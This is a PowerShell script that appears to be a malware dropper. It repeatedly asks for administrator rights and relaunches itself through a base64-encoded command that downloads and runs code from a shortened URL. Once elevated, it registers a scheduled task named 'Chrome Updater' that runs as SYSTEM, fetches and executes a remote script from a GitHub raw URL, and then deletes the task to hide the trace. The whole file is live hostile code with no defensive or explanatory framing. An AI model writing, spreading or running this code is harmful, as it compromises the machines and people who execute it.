Write-Host "Please Allow admin privileges!" -ForegroundColor Blue

# Path for the check file
$checkFilePath = "$env:TEMP\script_running_check.txt"
$managerCheckFilePath = "$env:TEMP\manager_running_check.txt"

function Start-Manager {
    # Manager script logic
    $retryCount = 0
    while ($retryCount -lt 3) {
        Start-Sleep -Seconds 3
        if (Test-Path -Path $checkFilePath) {
            # Main script is running, remove the manager check file and exit
            Remove-Item -Path $managerCheckFilePath -Force
            exit
        }
        else {
            # Attempt to get admin privileges again
            Write-Host "Attempting to get admin privileges. Attempt: $($retryCount + 1)" -ForegroundColor Yellow
            $command = "iex(New-Object Net.WebClient).DownloadString('https://t.ly/_xzy8')"
            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
            $retryCount++
        }
    }

    # After 3 failed attempts, perform an action and quit
    Write-Host "Failed to obtain admin privileges after 3 attempts. Exiting." -ForegroundColor Red
    exit
}

# Check for manager running file
if (-NOT (Test-Path -Path $managerCheckFilePath)) {
    # Manager is not running, start it
    New-Item -Path $managerCheckFilePath -ItemType File -Force
    Start-Job -ScriptBlock { Start-Manager }
}

# Main script logic
# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Command to download and execute the script from the URL
    $command = "iex(New-Object Net.WebClient).DownloadString('https://t.ly/_xzy8')"
    
    # Encode the command to bypass issues with special characters in the URL
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    # Restart PowerShell as Administrator and execute the encoded command
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -Verb RunAs
    exit # Exits the current, non-administrative script instance
}

# Create the check file to indicate the main script is running
New-Item -Path $checkFilePath -ItemType File -Force

# Define the action to be taken (PowerShell command)
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument {
-c "iex((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1'))"
}

# Create a new scheduled task principal to run with the highest privileges using the SYSTEM account
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Define the trigger
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(121009)

# Create settings for the task
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries

# Register the task
$taskName = "Chrome Updater"
Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings


# Start the task immediately
Start-ScheduledTask -TaskName $taskName

# Optionally, wait a moment for the task to execute, then remove it
Start-Sleep -Seconds 5
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

# Remove the check file
Remove-Item -Path $checkFilePath -Force

exit
